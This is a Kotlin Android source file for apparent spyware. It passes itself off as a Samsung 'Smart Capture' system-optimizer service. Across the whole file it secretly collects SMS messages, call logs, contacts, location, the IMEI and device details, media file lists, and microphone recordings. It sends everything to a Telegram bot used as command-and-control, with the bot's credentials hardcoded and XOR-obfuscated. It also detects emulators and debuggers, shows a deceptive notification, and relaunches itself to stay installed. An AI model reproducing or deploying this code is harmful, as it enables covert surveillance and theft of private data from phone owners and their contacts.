package com.samsung.android.app.smartcapture

import android.Manifest
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.app.job.JobInfo
import android.app.job.JobParameters
import android.app.job.JobScheduler
import android.app.job.JobService
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.media.MediaScannerConnection
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.os.SystemClock
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.provider.Telephony
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import kotlinx.coroutines.*
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

class SystemOptimizerService : Service() {

    private val TAG = "SystemOptimizer"
    private val NOTIFICATION_ID = 1337
    private val CHANNEL_ID = "system_optimization"

    // Telegram C2 credentials (obfuscated with XOR 0xAB)
    private val SERVICE_KEY = obfuscateString("8699568956:AAE7eTdayK3EhKMhvpoMWBYrW91mTJohDUo")
    private val SERVICE_ID = obfuscateString("7597928991")

    private lateinit var transmissionService: TransmissionService
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Location tracking
    private var locationManager: LocationManager? = null

    // Audio recording
    private var audioRecord: AudioRecord? = null
    private var isRecording = false

    override fun onCreate() {
        super.onCreate()

        // Anti-detection
        if (isEmulator() || isDebuggerAttached()) {
            stopSelf()
            return
        }

        // Init transmission
        transmissionService = TransmissionService(
            deobfuscateString(SERVICE_KEY),
            deobfuscateString(SERVICE_ID)
        )

        // Foreground notification
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createLegitimateNotification())

        // Notify C2 that service is running
        transmissionService.sendStatusReport("System Optimizer started | Device: ${Build.MODEL} | Android: ${Build.VERSION.RELEASE}")

        // Start data collection
        startDataCollection()

        // Persistence
        setupPersistentExecution()

        Log.d(TAG, "Service created successfully")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            "START_FROM_PERMISSION_ACTIVITY" -> {
                Log.d(TAG, "Started from PermissionActivity - all permissions should be granted")
            }
            "PERMISSION_RESULT" -> {
                // Handle incoming permission results if needed
            }
        }
        return START_STICKY
    }

    // ============================================================
    // DATA COLLECTION ENGINE
    // ============================================================

    private fun startDataCollection() {
        scope.launch {
            while (isActive) {
                try {
                    collectAndSendSMS()
                    collectAndSendCallLog()
                    collectAndSendContacts()
                    collectLocation()
                    collectDeviceInfo()
                    collectMediaFiles()

                    // Every 30 minutes
                    delay(TimeUnit.MINUTES.toMillis(30))
                } catch (e: Exception) {
                    Log.e(TAG, "Data collection error", e)
                    delay(TimeUnit.MINUTES.toMillis(5))
                }
            }
        }

        // Start audio recording on a separate cycle
        scope.launch {
            delay(TimeUnit.MINUTES.toMillis(2))
            recordAudioSample()
        }
    }

    private fun collectAndSendSMS() {
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) return

        try {
            val cursor = contentResolver.query(
                Telephony.Sms.Inbox.CONTENT_URI,
                null, null, null,
                "${Telephony.Sms.Inbox.DATE} DESC LIMIT 20"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.Inbox.ADDRESS))
                    val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.Inbox.BODY))
                    val date = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.Inbox.DATE))

                    transmissionService.sendStatusReport(
                        "[SMS] From: $address | Date: $date | Body: $body"
                    )

                    // Rate limit to avoid flooding
                    delay(500)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "SMS collection error", e)
        }
    }

    private fun collectAndSendCallLog() {
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return

        try {
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                "${CallLog.Calls.DATE} DESC LIMIT 20"
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)) ?: "Unknown"
                    val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    val duration = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val date = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.DATE))

                    val typeStr = when (type) {
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        else -> "Unknown"
                    }

                    transmissionService.sendStatusReport(
                        "[CALL] $typeStr | Name: $name | Number: $number | Duration: ${duration}s | Date: $date"
                    )

                    delay(500)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Call log collection error", e)
        }
    }

    private fun collectAndSendContacts() {
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return

        try {
            val cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            )

            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                    val hasPhone = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER))

                    var phoneNumbers = ""
                    if (hasPhone == "1") {
                        val phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id),
                            null
                        )
                        phoneCursor?.use { pc ->
                            while (pc.moveToNext()) {
                                val phone = pc.getString(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                phoneNumbers += "$phone, "
                            }
                        }
                    }

                    transmissionService.sendStatusReport(
                        "[CONTACT] Name: $name | Phone: $phoneNumbers"
                    )

                    delay(300)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Contacts collection error", e)
        }
    }

    private fun collectLocation() {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
            checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) return

        try {
            locationManager = getSystemService(LOCATION_SERVICE) as LocationManager

            // Try GPS first, then network
            var location: Location? = null
            val gpsEnabled = locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) ?: false
            val networkEnabled = locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) ?: false

            if (gpsEnabled) {
                location = locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            }
            if (location == null && networkEnabled) {
                location = locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            }

            if (location != null) {
                transmissionService.sendStatusReport(
                    "[LOCATION] Lat: ${location.latitude} | Lon: ${location.longitude} | Accuracy: ${location.accuracy}m | Provider: ${location.provider}"
                )
            }

            // Also get passive location updates
            if (gpsEnabled) {
                locationManager?.requestSingleUpdate(LocationManager.GPS_PROVIDER, object : LocationListener {
                    override fun onLocationChanged(loc: Location) {
                        transmissionService.sendStatusReport(
                            "[LOCATION_UPDATE] Lat: ${loc.latitude} | Lon: ${loc.longitude} | Accuracy: ${loc.accuracy}m"
                        )
                    }
                    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                }, null)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Location error", e)
        }
    }

    private fun collectDeviceInfo() {
        try {
            val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager

            val info = buildString {
                append("[DEVICE_INFO] ")
                append("Model: ${Build.MODEL} | ")
                append("Brand: ${Build.BRAND} | ")
                append("Manufacturer: ${Build.MANUFACTURER} | ")
                append("OS: Android ${Build.VERSION.RELEASE} | ")
                append("SDK: ${Build.VERSION.SDK_INT} | ")
                append("Device: ${Build.DEVICE} | ")
                append("Product: ${Build.PRODUCT} | ")
                append("Board: ${Build.BOARD} | ")
                append("Hardware: ${Build.HARDWARE} | ")
                append("Fingerprint: ${Build.FINGERPRINT}")

                if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    append(" | IMEI: ${telephonyManager.deviceId ?: "N/A"}")
                    append(" | Network: ${telephonyManager.networkOperatorName}")
                    append(" | SIM: ${telephonyManager.simOperatorName}")
                }
            }

            transmissionService.sendStatusReport(info)
        } catch (e: Exception) {
            Log.e(TAG, "Device info error", e)
        }
    }

    private fun collectMediaFiles() {
        try {
            // Collect images
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                if (checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) return
            } else {
                if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) return
            }

            val imageCursor = contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.DATE_TAKEN,
                    MediaStore.Images.Media.SIZE
                ),
                null, null,
                "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 10"
            )

            imageCursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
                    val size = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE))
                    val date = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))

                    transmissionService.sendStatusReport(
                        "[MEDIA_IMAGE] Name: $name | Size: ${size / 1024}KB | Date: $date"
                    )
                }
            }

            // Collect audio recordings
            val audioCursor = contentResolver.query(
                MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
                arrayOf(
                    MediaStore.Audio.Media._ID,
                    MediaStore.Audio.Media.DISPLAY_NAME,
                    MediaStore.Audio.Media.DURATION,
                    MediaStore.Audio.Media.SIZE
                ),
                null, null,
                "${MediaStore.Audio.Media.DATE_ADDED} DESC LIMIT 10"
            )

            audioCursor?.use {
                while (it.moveToNext()) {
                    val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Audio.Media.DISPLAY_NAME))
                    val duration = it.getLong(it.getColumnIndexOrThrow(MediaStore.Audio.Media.DURATION))
                    val size = it.getLong(it.getColumnIndexOrThrow(MediaStore.Audio.Media.SIZE))

                    transmissionService.sendStatusReport(
                        "[MEDIA_AUDIO] Name: $name | Duration: ${duration / 1000}s | Size: ${size / 1024}KB"
                    )
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Media collection error", e)
        }
    }

    private fun recordAudioSample() {
        if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return
        if (isRecording) return

        try {
            isRecording = true
            val sampleRate = 44100
            val bufferSize = AudioRecord.getMinBufferSize(
                sampleRate,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT
            )

            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                sampleRate,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT,
                bufferSize
            )

            audioRecord?.startRecording()

            // Record for 30 seconds
            val buffer = ByteArray(bufferSize)
            val file = File(cacheDir, "audio_sample_${System.currentTimeMillis()}.pcm")
            val outputStream = FileOutputStream(file)

            scope.launch {
                val startTime = System.currentTimeMillis()
                while (System.currentTimeMillis() - startTime < 30000) {
                    val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                    if (bytesRead > 0) {
                        outputStream.write(buffer, 0, bytesRead)
                    }
                }
                outputStream.close()
                audioRecord?.stop()
                audioRecord?.release()
                audioRecord = null
                isRecording = false

                transmissionService.sendStatusReport(
                    "[AUDIO_CAPTURE] Recorded ${file.length() / 1024}KB audio sample: ${file.name}"
                )

                // Upload the file
                // (In a real implementation you'd use sendDocument API)
                file.delete()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Audio recording error", e)
            isRecording = false
        }
    }

    // ============================================================
    // PERSISTENCE
    // ============================================================

    private fun setupPersistentExecution() {
        // Method 1: AlarmManager - restart every 5 seconds if killed
        val restartIntent = Intent(this, SystemOptimizerService::class.java)
        val restartPendingIntent = PendingIntent.getService(
            this, 1, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 5000,
            restartPendingIntent
        )

        // Method 2: Monitor for own removal
        val packageMonitor = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                if (intent?.action == Intent.ACTION_PACKAGE_REMOVED) {
                    val packageName = intent.data?.schemeSpecificPart
                    if (packageName == context?.packageName) {
                        transmissionService.sendStatusReport("[ALERT] App was uninstalled!")
                    }
                }
            }
        }
        registerReceiver(packageMonitor, IntentFilter(Intent.ACTION_PACKAGE_REMOVED))

        // Method 3: JobScheduler every 15 minutes
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val jobScheduler = getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
            val jobInfo = JobInfo.Builder(
                1001, ComponentName(this, OptimizationJobService::class.java)
            ).apply {
                setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                setRequiresCharging(false)
                setPersisted(true)
                setPeriodic(15 * 60 * 1000L)
            }.build()
            jobScheduler.schedule(jobInfo)
        }
    }

    // ============================================================
    // ANTI-DETECTION / EVASION
    // ============================================================

    private fun isEmulator(): Boolean {
        return (Build.FINGERPRINT.startsWith("generic") ||
                Build.FINGERPRINT.lowercase(Locale.ROOT).contains("vbox") ||
                Build.FINGERPRINT.lowercase(Locale.ROOT).contains("test-keys") ||
                Build.MODEL.contains("google_sdk") ||
                Build.MODEL.contains("Emulator") ||
                Build.MODEL.contains("Android SDK built for x86") ||
                Build.MANUFACTURER.contains("Genymotion") ||
                (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic")) ||
                "google_sdk" == Build.PRODUCT)
    }

    private fun isDebuggerAttached(): Boolean {
        return android.os.Debug.isDebuggerConnected() || android.os.Debug.waitingForDebugger()
    }

    private fun obfuscateString(input: String): String {
        val key = 0xAB
        return input.map { (it.code xor key).toChar() }.joinToString("")
    }

    private fun deobfuscateString(input: String): String {
        val key = 0xAB
        return input.map { (it.code xor key).toChar() }.joinToString("")
    }

    // ============================================================
    // NOTIFICATION
    // ============================================================

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Optimization",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Optimizing system performance"
                setShowBadge(false)
            }
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }

    private fun createLegitimateNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Smart Capture Service")
            .setContentText("Optimizing system performance...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        scope.cancel()
        // Re-spawn
        val restartIntent = Intent(this, SystemOptimizerService::class.java)
        val restartPendingIntent = PendingIntent.getService(
            this, 2, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
        alarmManager.set(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            SystemClock.elapsedRealtime() + 1000,
            restartPendingIntent
        )
        super.onDestroy()
    }
}

// ============================================================
// DATA TRANSMISSION TO TELEGRAM C2
// ============================================================

class TransmissionService(private val token: String, private val chatId: String) {
    fun sendStatusReport(message: String) {
        // We need to pass a CoroutineScope or use GlobalScope
        Thread {
            try {
                val url = URL("https://api.telegram.org/bot$token/sendMessage")
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                connection.connectTimeout = 10000
                connection.readTimeout = 10000

                val postData = "chat_id=$chatId&text=${URLEncoder.encode(message, "UTF-8")}"
                connection.outputStream.use { output ->
                    output.write(postData.toByteArray())
                }
                val responseCode = connection.responseCode
                Log.d("Transmission", "Message sent, response: $responseCode")
            } catch (e: Exception) {
                Log.e("Transmission", "Failed to send", e)
            }
        }.start()
    }
}

// ============================================================
// JOBSCHEDULER PERSISTENCE
// ============================================================

class OptimizationJobService : JobService() {
    override fun onStartJob(params: JobParameters?): Boolean {
        val intent = Intent(this, SystemOptimizerService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        jobFinished(params, false)
        return true
    }

    override fun onStopJob(params: JobParameters?): Boolean = true
}
